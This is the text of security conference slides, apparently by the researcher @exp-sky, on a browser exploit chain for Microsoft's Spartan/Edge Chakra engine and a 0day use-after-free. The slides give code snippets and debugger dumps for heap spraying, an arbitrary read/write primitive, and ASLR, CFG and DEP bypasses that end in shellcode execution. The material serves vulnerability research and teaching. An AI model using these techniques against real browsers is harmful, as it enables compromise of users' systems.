Exploit Bypass All
• 1、HeapSpray 
• 2、memory read/write 
• 3、bypass ASLR 
• 4、bypass CFG 
• 5、bypass DEP 
• 6、exec ShellCode
Exploit Bypass All
• 1、HeapSpray
function heap_spary(num) 
{ 
    array_1 = new Array(); 
    array_1_size = 0x1000 * num; 
    for(var i=0; i dd 11110000 
11110000  562853c4 063b75c0 00000000 00010005 
11110010  00000033 00000000 11110024 11110024 
11110020  05a25ae0 00000000 00000033 00000033 
11110030  00000000 0c0c0c0c 0c0c0c0c 0c0c0c0c 
11110040  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 
11110050  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 
11110060  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 
11110070  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c
Exploit Bypass All
• 1、HeapSpray 
• 2、Memory read/write 
• 3、Bypass ASLR 
• 4、Bypass CFG 
• 5、Bypass DEP 
• 6、Exec ShellCode
Exploit Bypass All
• 1、Memory read/write
0:024> dd 
11110100  562853c4 063b75c0 00000000 00010005 
11110110  7fffffff 00000000 11110124 11110124 
11110120  05a25ae0 00000000 7fffffff 7fffffff 
11110130  00000000 0c0c0c0c 0c0c0c0c 0c0c0c0c 
11110140  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 
11110150  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 
11110160  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 
11110170  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c
Exploit Bypass All
• 1、Memory read/write
Exploit Bypass All
• 1、HeapSpray 
• 2、Memory read/write 
• 3、Bypass ASLR 
• 4、Bypass CFG 
• 5、Bypass DEP 
• 6、Exec ShellCode
Exploit Bypass All
• Bypass ASLR
var array_vft_address = read_dword(0x11110200); 
var chakra_base_addr = array_vft_address - 0x000653c4;
Exploit Bypass All
• 1、HeapSpray 
• 2、Memory read/write 
• 3、Bypass ASLR 
• 4、Bypass CFG 
• 5、Bypass DEP 
• 6、Exec ShellCode
Exploit Bypass All
• Bypass CFG
Exploit Bypass All
• 1、HeapSpray 
• 2、Memory read/write 
• 3、Bypass ASLR 
• 4、Bypass CFG 
• 5、Bypass DEP 
• 6、Exec ShellCode
Exploit Bypass All
• Bypass DEP
void __thiscall Memory::SmallHeapBlockT::ClearPageHeapState 
{ 
    int flOldProtect = 0; 
    if(this->address) 
        VirtualProtect(this->address,0x1000,this->protect,&flOldProtect); 
}
struct Memory::SmallHeapBlockT 
{ 
    +0x14 DWORD protect; 
    +0x18 void *address; 
}
Exploit Bypass All
• bypass DEP
//bypass CFG 
//ecx = [object+0x04]
Exploit Bypass All
• bypass DEP
write_dword(old_ecx_struct+0x18,shell_code_address); 
write_dword(old_ecx_struct+0x14,0x40);  //read+write+execute
Exploit Bypass All
• bypass DEP
0:025> u poi(0618b150) 
chakra!Js::LiteralString::`vftable': 
0:025> !address poi(0618b150+8) 
Usage:                   
Base Address:           08450000 
End Address:            08451000 
Region Size:            00001000 (   4.000 kB) 
State:                  00001000          MEM_COMMIT 
Protect:                00000040          PAGE_EXECUTE_READWRITE 
Type:                   00020000          MEM_PRIVATE 
Allocation Base:        08450000 
Allocation Protect:     00000004          PAGE_READWRITE
Exploit Bypass All
• 1、HeapSpray 
• 2、Memory read/write 
• 3、Bypass ASLR 
• 4、Bypass CFG 
• 5、Bypass DEP 
• 6、Exec ShellCode
Exploit Bypass All
• Exec ShellCode
write_dword(test2_function_addr,shell_code_address);
Exploit Bypass All
• Exec ShellCode
Spartan 0day & Exploit
• 1、Isolation Heap 
• 2、Memory Protection 
• 3、Spartan Memory Manage 
• 4、CFG 
• 5、Exploit Bypass All 
• 6、0day 
• 7、Q&A
0day
• Bypass MemoryProtection & Isolation Heap
0:008> r 
eax=00000000 ebx=05689bc8 ecx=056c5f98 edx=00000001 esi=056c5f98 edi=00000000 
eip=674887ac esp=054d9af4 ebp=054d9af4 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202 
674887ac 8b5124     mov     edx,dword ptr [ecx+24h] ds:0023:056c5fbc=????????
0day
• Bypass MemoryProtection & Isolation Heap
1:020> r 
eax=00000001 ebx=05158500 ecx=00000005 edx=04444420 esi=097c7810 edi=00000005 
eip=61aaa535 esp=0582940c ebp=05829414 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
61aaa535 8b5624     mov     edx,dword ptr [esi+24h] ds:0023:097c7834=111111ff 
1:020> dd esi 
09df3880  0000000d 11111111 11111111 11111111 
09df3890  11111111 11111111 11111111 11111111 
09df38a0  11111111 111111ff 11111111 11111111 
09df38b0  11110036 11111111 11111111 11111111
0day
• Bypass check
next object 
… … 
void * p_object1 
void * p_object2 
… …
uaf object 
… … 
0x30 : p_object 
… …
object address?
0day
• Bypass check
next object 
… … 
void * p_object1 
void * p_object2 
… …
uaf object 
… … 
0x30 : p_object 
… …
next object 
… … 
void * p_object1 
void * p_object2 
… …
next object 
… … 
void * p_object1 
void * p_object2 
… …
0day
• Bypass check
uaf object 
… … 
0x30 : p_object 
… …
0day
Spartan 0day & Exploit
• 1、Isolation Heap 
• 2、Memory Protection 
• 3、Spartan Memory Manage 
• 4、CFG 
• 5、Exploit Bypass All 
• 6、0day 
• 7、Q&A
Spartan 0day & Exploit
Q&A
Spartan 0day & Exploit
Thanks! 
•
Twitter & Weibo : @exp-sky 
•
Blog : http://exp-sky.org 
•
Email : PI:EMAIL